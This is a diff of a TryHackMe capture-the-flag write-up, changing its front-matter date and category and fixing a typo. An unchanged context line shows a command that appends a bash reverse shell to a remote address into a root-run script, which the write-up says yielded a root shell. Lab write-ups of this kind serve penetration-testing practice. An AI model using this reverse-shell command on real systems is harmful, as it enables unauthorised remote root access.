@@ -1,7 +1,7 @@
 ---
 title: test
-date: YYYY-MM-DD
-category: writeups
+date: 2025-01-01
+category: tryhackme
 enrich: true
 image: assets/screenshot.png
 tags: ctf, pentest, linux
@@ -60,4 +60,4 @@ echo "bash -i >& /dev/tcp/10.9.0.218/8888 0>&1" >> /etc/print.sh
 
 ```
 
-and after excutable i got root shell
+and after excutable, i got root shell
